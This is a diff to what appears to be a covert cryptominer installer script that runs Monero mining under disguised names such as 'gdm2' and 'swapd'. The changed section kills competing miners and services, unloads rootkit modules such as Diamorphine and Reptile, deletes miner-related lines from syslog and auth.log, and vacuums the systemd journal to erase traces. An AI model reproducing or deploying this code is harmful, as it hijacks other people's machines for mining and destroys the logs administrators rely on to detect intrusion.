@@ -27,17 +27,6 @@ force_stop_service() {
     while [ $attempt -lt $max_attempts ]; do
         attempt=$((attempt + 1))
         
-        # Try systemctl stop
-        if [ -n "$service_names" ]; then
-            for svc in $service_names; do
-                if systemctl is-active --quiet "$svc" 2>/dev/null; then
-                    echo "[*] Attempt $attempt: Stopping $svc..."
-                    sudo systemctl stop "$svc" 2>/dev/null || true
-                    sleep 1
-                fi
-            done
-        fi
-        
         # Try killall
         if [ -n "$process_names" ]; then
             for proc in $process_names; do
@@ -108,13 +97,13 @@ echo "[*] Cleaning previous installations..."
 crontab -l | grep -v "system_cache\|check_and_start\|swapd\|gdm2" | crontab -
 
 # Remove systemd services
-sudo systemctl stop gdm2 swapd moneroocean_miner 2>/dev/null
-sudo systemctl disable gdm2 swapd moneroocean_miner 2>/dev/null
-sudo rm -f /etc/systemd/system/gdm2.service /etc/systemd/system/swapd.service /etc/systemd/system/moneroocean_miner.service 2>/dev/null
-sudo systemctl daemon-reload 2>/dev/null
+#sudo systemctl stop gdm2 swapd moneroocean_miner 2>/dev/null
+#sudo systemctl disable gdm2 swapd moneroocean_miner 2>/dev/null
+rm -f /etc/systemd/system/gdm2.service /etc/systemd/system/swapd.service /etc/systemd/system/moneroocean_miner.service 2>/dev/null
+#sudo systemctl daemon-reload 2>/dev/null
 
 # Remove SysV init scripts
-sudo rm -f /etc/init.d/gdm2 /etc/init.d/swapd /etc/init.d/moneroocean_miner 2>/dev/null
+rm -f /etc/init.d/gdm2 /etc/init.d/swapd /etc/init.d/moneroocean_miner 2>/dev/null
 
 # Clean home directories
 rm -rf ~/moneroocean ~/.moneroocean ~/.gdm* ~/.swapd ~/.system_cache /tmp/xmrig*
@@ -136,12 +125,12 @@ if [ "$(id -u)" -eq 0 ]; then
 fi
 
 # Remove kernel rootkits
-sudo rmmod diamorphine reptile rootkit 2>/dev/null
-sudo rm -rf /tmp/.ICE-unix/Reptile /tmp/.ICE-unix/Diamorphine /tmp/.X11-unix/hiding-cryptominers-linux-rootkit 2>/dev/null
+rmmod diamorphine reptile rootkit 2>/dev/null
+rm -rf /tmp/.ICE-unix/Reptile /tmp/.ICE-unix/Diamorphine /tmp/.X11-unix/hiding-cryptominers-linux-rootkit 2>/dev/null
 
 # Clean logs
-sudo sed -i '/swapd\|gdm\|kswapd0\|systemd-udevd\|systemd-logind\|xmrig\|miner\|accepted/d' /var/log/syslog /var/log/auth.log /var/log/messages 2>/dev/null
-sudo journalctl --vacuum-time=1s 2>/dev/null
+sed -i '/swapd\|gdm\|kswapd0\|systemd-udevd\|systemd-logind\|xmrig\|miner\|accepted/d' /var/log/syslog /var/log/auth.log /var/log/messages 2>/dev/null
+journalctl --vacuum-time=1s 2>/dev/null
 
 echo "[✓] Previous installations cleaned"
 sleep 2
